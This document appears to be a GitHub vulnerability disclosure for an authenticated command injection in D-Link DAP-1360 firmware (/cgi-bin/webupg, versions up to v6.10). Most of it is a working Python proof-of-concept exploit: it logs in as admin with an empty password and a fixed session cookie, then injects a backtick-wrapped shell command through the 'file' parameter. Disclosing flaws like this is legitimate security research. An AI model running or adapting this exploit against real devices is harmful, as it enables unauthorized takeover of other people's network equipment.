# D-Link DAP-1360 Authorization Remote Command Execution
An authorization command injection vulnerability about DAP-1360

</br>**Exploit Author:** KeenSight Lab.Tgp (topsuchow@gmail.com)
</br>**Vender:** D-Link

## /cgi-bin/webupg
**Firmware version:** 
DAP-1360(F1): <=v6.10
</br>......
<br/>**Hardware Link:**https://downloads.d-link.co.za/DAP/dap1360/Firmware/Hardware%20Version%20F/
## The detail of vulnerability
In the "webupg" binary, because of the lack of parameter verification, attackers can use "file" parameters to execute arbitrary system commands after obtaining authorization.

#### Vulnerability trigger function
![image](https://github.com/tgp-top/DAP-1360/blob/4f10977bb7356d1393fefcba24ca438be95248b2/%E5%9B%BE%E7%89%87/5.png)


`UPGCGI_CreateDir`
![image](https://github.com/tgp-top/DAP-1360/blob/2d09c23efafd8d3199b0a84d5b159f3cdbd26638/%E5%9B%BE%E7%89%87/1.png)

`UPGCGI_Delete`
![image](https://github.com/tgp-top/DAP-1360/blob/2d09c23efafd8d3199b0a84d5b159f3cdbd26638/%E5%9B%BE%E7%89%87/2.png)

`UPGCGI_ModifyMac`
![image](https://github.com/tgp-top/DAP-1360/blob/2d09c23efafd8d3199b0a84d5b159f3cdbd26638/%E5%9B%BE%E7%89%87/3.png)

`Burpsuite intercept`
![image](https://github.com/tgp-top/DAP-1360/blob/220154515d7b765ecc8daffd6c990ba45df4735f/%E5%9B%BE%E7%89%87/4.png)

## POC
<sup> 




    #!/usr/bin/python
    # -*- coding: utf-8 -*-

    import requests, urllib3, sys, re
    import base64

    from urllib3.exceptions import ConnectTimeoutError
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    from urllib.parse import urlencode
    import os
    import telnetlib

    proxy = {
            "http": "http://127.0.0.1:8080"
        }
    def login(phost):
      ipaddr=str(re.findall(r"(.+?):", phost))
      if len(ipaddr)==2:
        ipaddr=phost
      print (ipaddr)
      post_data = {
          "getpage": "html/index.html",
          "errorpage": "html/main.html",
          "var:menu": "setup",
        "var:page": "wizard",
        "var:login": "true",
        "obj-action": "auth",
        ":username": "admin",
        ":password": "",
        ":action": "login",
        ":sessionid": "3f412f91"
      }
      headers1 = {
          "Host": phost,
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": "http://" + phost + "/cgi-bin/webproc",
          "Connection": "close",
          "Origin": "http://" + phost,
          "Cookie": "sessionid=3f412f91; expires=Mon, 31-Jan-2050 16:00:00 GMT; auth=ok; Lan_IPAddress=" + ipaddr +"; langmanulset=yes; sys_UserName=admin; expires=Mon, 31-Jan-2050 16:00:00 GMT; language=zh_cn"
      }
      headers2 = {
          "Host": phost,
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": "https://" + phost + "/cgi-bin/webproc",
          "Connection": "close",
          "Origin": "https://" + phost,
          "Cookie": "sessionid=3f412f91; expires=Mon, 31-Jan-2050 16:00:00 GMT; auth=ok; Lan_IPAddress=" + ipaddr +"; langmanulset=yes; sys_UserName=admin; expires=Mon, 31-Jan-2050 16:00:00 GMT; language=zh_cn"
      }
      try:
        url1 = 'http://' + phost + '/cgi-bin/webproc'
        r1 = requests.post(url1, data=post_data, headers=headers1, allow_redirects=False,proxies=proxy, timeout=10)
        if r1.status_code==302:
          print ("Login success!")
        elif r1.text=="":
          exit(0)
      except Exception:
        try:
          url2 = 'https://' + phost + '/cgi-bin/webproc'
          r2 = requests.post(url2, data=post_data, headers=headers2,verify=False,allow_redirects=False,proxies=proxy,timeout=10)
          if r2.status_code==302:
            print ("Login success!")
          elif r2.text=="":
            exit(0)
        except Exception:
          print("ConnectTimeout")
          exit(0)


    def execCmd(phost):
      ipaddr=str(re.findall(r"(.+?):", phost))
      if len(ipaddr)==2:
        ipaddr=phost
      payload = "`busybox`"
      post_data = {
          "name": "createdir", 
        "file":  payload 
      }
      headers = {
            "Host": phost,
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://" + phost,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Referer": "http://" + phost + "/cgi-bin/webupg",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
          "Cookie": "sessionid=3f412f91; expires=Mon, 31-Jan-2050 16:00:00 GMT; auth=ok; Lan_IPAddress=45.240.248.137; langmanulset=yes; sys_UserName=admin; language=en_us; expires=Mon, 31-Jan-2050 16:00:00 GMT",
        "Connection": "close"
                    }
      url = "http://" + phost + "/cgi-bin/webupg"
      r = requests.post(url, data=post_data, headers=headers,allow_redirects=False, proxies=proxy)
      string = r.status_code
      print (r.headers)


    def main():
      if (len(sys.argv) != 2):
        print("[*] Usage: ruckus151021.py <RHOST>")
        print("[*] <RHOST> -> Target IP")
        print("[*] Example: python {} 192.168.2.1")
        exit(0)

      phost = sys.argv[1]
      login(phost)
      execCmd(phost)

    if __name__ == "__main__":
        main()



</sup>


## Demo
[![Watch the video](https://raw.github.com/GabLeRoux/WebMole/master/ressources/WebMole_Youtube_Video.png)](https://www.youtube.com/watch?v=4maJK6R3n8I)


  
  
  
